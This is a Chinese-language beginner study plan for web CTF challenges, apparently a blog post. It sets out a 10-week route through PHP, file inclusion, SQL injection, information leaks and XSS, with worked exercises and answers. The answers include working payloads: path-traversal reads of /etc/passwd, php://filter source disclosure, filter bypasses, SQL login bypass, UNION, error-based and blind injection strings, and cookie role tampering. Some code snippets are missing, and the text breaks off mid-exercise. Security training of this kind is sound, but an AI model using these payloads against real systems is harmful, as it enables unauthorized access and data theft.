Web 新手完整学习规划

langkong10132026-10-212026-10-28

结合你的现状：PHP 没学明白 · LFI 完全不会 · SQL 完全不会

10 周路线 · 覆盖 Web 全部前置知识 · 9 个模块 49 道例题 · 全部附答案

一、你的现状（先看清自己站在哪）

模块 状态 具体表现 本次安排
HTTP / F12 会用基础 能看请求、能用 curl 发 GET 第 4 周巩固
PHP 语法 不会 看源码像看天书，不懂 $_GET / include 第 1 周重点（5 天）
LFI 文件包含 不会 只会背 payload，不懂为什么 第 2 周重点（5 天）
SQL 注入 不会 没写过 SELECT，不懂表结构 第 3 周 + 第 5 周（共 8 天）
信息泄露 半会 做过 1 道源码题 第 4 周
XSS 未接触 — 第 7 周
文件上传 未接触 — 第 6 周
命令执行 未接触 — 第 6 周
Burp 未装 目前用 F12 代替 第 4 周

结论：你的弱项集中在「后端代码」这条线上（PHP → LFI → SQL），而它们正好是 Web 题分值最密集的地方。所以前 5 周全部投在这里。

二、这份计划的 5 条原则

  1. 地基优先：先 PHP，再 LFI，再 SQL。顺序不能反，否则每步都要回头补。
  2. 弱项加倍：PHP / LFI / SQL 占前 5 周；其他模块按需穿插。
  3. 每天 1～2 小时：30 分钟学 + 40 分钟做题 + 20 分钟对答案。
  4. 例题先做后看：答案就在题后面，但先自己写一遍再看。
  5. 卡 30 分钟就看答案：不要死磕，理解比”做出来”重要。

降级规则：满课那天只做 2 道例题；周末补。宁可每天 30 分钟，不要断更。

三、10 周总路线

周次 主题 覆盖知识 例题
第 1 周 PHP 语法速通 变量 / 数组 / 函数 / 超全局 / include A1–A8
第 2 周 LFI 文件包含 include / 伪协议 / 路径穿越 / 过滤绕过 B1–B5
第 3 周 SQL 基础 + 注入原理 SELECT / 万能密码 / 注释 / 过滤绕过 C1–C6
第 4 周 HTTP + 信息泄露 + 工具 状态码 / Cookie / robots / 备份 / Burp D1–D5、I1–I3
第 5 周 SQL 进阶 UNION / 报错 / 布尔 / 时间盲注 C7–C10
第 6 周 文件上传 + 命令执行 前端验证 / MIME / 后缀 / 命令拼接 F1–F4、G1–G3
第 7 周 XSS 反射 / 存储 / DOM / 过滤绕过 E1–E4
第 8 周 编码与数据格式 URL / Base64 / Hex / HTML 实体 / JSON H1–H5
第 9 周 综合刷题 CTF² 公开练习场，按模块刷 错题重做
第 10 周 复盘 + 模拟 整理复盘、限时做一套 自测清单

时间分配建议：第 1–3 周每天 1.5 小时（最重要）；第 4–8 周每天 1 小时；第 9–10 周周末集中。

四、分模块例题（共 49 道，全部附答案）

用法：先自己写答案，再看下一行的【答案】和讲解。

模块 A：PHP 语法（8 题）

A1. 下面输出什么？

【答案】true、false

讲解：== 只比值，=== 还比类型。”1” 和 1 值相等但类型不同。

A2. 访问 ?id=1a，输出什么？

【答案】no

讲解：参数存在，但 “1a” 不是纯数字，is_numeric 返回 false。

A3. 输出什么？

【答案】bcd2

讲解：substr 从下标 1 取 3 个 → bcd；strpos 找 c 的位置，从 0 数 → 2。

A4. 输出什么？

1, "b"=>2]; foreach ($arr as $k => $v) { echo $k . "=" . $v . ";"; } ?>

【答案】a=1;b=2;

讲解：foreach 遍历关联数组，$k 是键，$v 是值，点号拼接字符串。

A5. 输出什么？

【答案】hi!

讲解：&$x 是引用传递，函数里改的是外面那个变量。去掉 & 就还是 hi。

A6. 访问 ?name=gjz，输出什么？

【答案】hello, gjz

讲解：$_GET 接收 URL 参数，点号拼接。

A7. 下面代码的作用是什么？

【答案】把 file 参数指定的文件包含进来执行/输出。

讲解：这就是文件包含漏洞的源头——参数可控 + include。

A8. 下面输出什么？为什么？

【答案】yes

讲解：弱比较时 “0” 会被转成 false，所以条件成立。这是 CTF 弱比较绕过的原理。

模块 B：LFI 文件包含（5 题）

B1. 传什么可以读到 /etc/passwd？

【答案】?file=/etc/passwd

讲解：include 直接读文件，/etc/passwd 不是 PHP 代码，会原样输出。

B2. 想读 index.php 的源码，payload 怎么写？为什么不能直接传 index.php？

【答案】?file=php://filter/convert.base64-encode/resource=index.php

讲解：直接传会被 PHP 执行，看不到源码；用 filter 先 base64 编码再输出，拿到后解码即可。

B3. 过滤了 ../，怎么读 /etc/passwd？（注意：不要求穿越）

【答案】?f=/etc/passwd（绝对路径不含 ..）

讲解：黑名单过滤很容易被绝对路径绕过。

B4. 下面的替换能绕过吗？传什么？

【答案】能。传 ….//….//etc/passwd，替换后变成 ../../etc/passwd。

讲解：只替换一次，删掉中间的 ../ 后，剩下的字符又拼成了 ../。

B5. 白名单只允许 source.php，怎么读 ffffllllaaaagggg？

$whitelist = [“source.php”, “hint.php”];
$_page = substr($page, 0, strpos($page . “?”, “?”));
if (in_array($_page, $whitelist)) { include $page; }

【答案】?file=source.php?/../../../../ffffllllaaaagggg

讲解：截断后是 source.php → 过白名单；include 用整串 → ../ 穿越到目标文件。核心：校验值 ≠ 执行值。

模块 C：SQL 注入（10 题）

C1. 查 username 为 admin 的用户，SQL 怎么写？

【答案】SELECT * FROM users WHERE username=’admin’;

C2. 怎么判断表有几列？

【答案】ORDER BY 1、2、3… 逐个试，直到报错；报错前那个数字就是列数。

C3. 字符型注入，写万能密码。

$sql = “SELECT * FROM users WHERE username=’$u’ AND password=’$p’”;

【答案】?u=admin’ or 1=1#

讲解：单引号闭合，or 1=1 恒真，# 注释掉后面的密码判断。

C4. 数字型注入，写 payload。

$sql = “SELECT * FROM news WHERE id=$id”;

【答案】?id=1 or 1=1

讲解：数字型没有引号，不需要闭合，直接接 or 1=1。

C5. # 被过滤了，还能怎么注释？

【答案】用 – （减号减号空格）或 /* */。

C6. 空格被过滤了，怎么绕过？

【答案】用 // 或 %09（Tab）代替空格。例：admin’//or/**/1=1#

C7. 已知 3 列、回显位 2，查所有表名。

【答案】?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –

讲解：group_concat 合并多行；information_schema.tables 存表名。

C8. 已知表 flag、列 flag，取数据。

【答案】?id=-1 union select 1,flag,3 from flag –

讲解：UNION 列数必须一致；-1 让原查询为空，页面只显示联合结果。

C9. 页面只报错，读库名。

【答案】?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) –

讲解：updatexml 第二个参数不合法会报错，把库名拼进报错信息。/0x7e 是 ~。

C10. 页面只分真假，判断库名第一个字符是否为 c（ASCII 99）。

【答案】?id=1 and ascii(substr(database(),1,1))=99 –

讲解：真则页面正常，假则异常。若无差别，改用 if(…,sleep(3),0) 做时间盲注。

模块 D：HTTP 与信息泄露（5 题）

D1. 页面什么都没有，题目提示”看公开的站点说明”，先访问什么？

【答案】/robots.txt

讲解：robots.txt 常泄露隐藏路径；Disallow 后面那条往往有东西。

D2. 常见备份文件名有哪些？

【答案】index.php.bak、index.php~、index.php.swp、www.zip、www.tar.gz、backup.zip

D3. 页面右键被禁用，怎么看源码？

【答案】Ctrl+U，或地址栏加 view-source: 前缀，或 F12 查看器。

D4. 网页显示”当前身份 guest”，怎么变成 admin？

【答案】F12 → Application/存储 → Cookies，把 role 的值改成 admin，刷新。

D5. 401 和 403 的区别？

【答案】401 = 没认证（不知道你是谁）；403 = 已认证但没权限（知道你是谁但不许进）。

模块 E：XSS（4 题）

E1. 搜索框把输入原样显示在页面，写一个验证 XSS 的 payload。

【答案】

讲解：能弹窗说明 JS 被执行，存在反射型 XSS。

E2. 留言板内容会存进数据库并显示给所有人，属于哪种 XSS？

【答案】存储型 XSS

E3. 页面用 innerHTML 把 URL 参数写进 DOM，属于哪种？

【答案】DOM 型 XSS

讲解：不经过服务器，纯前端把不可信数据写进 DOM。

E4. 过滤了
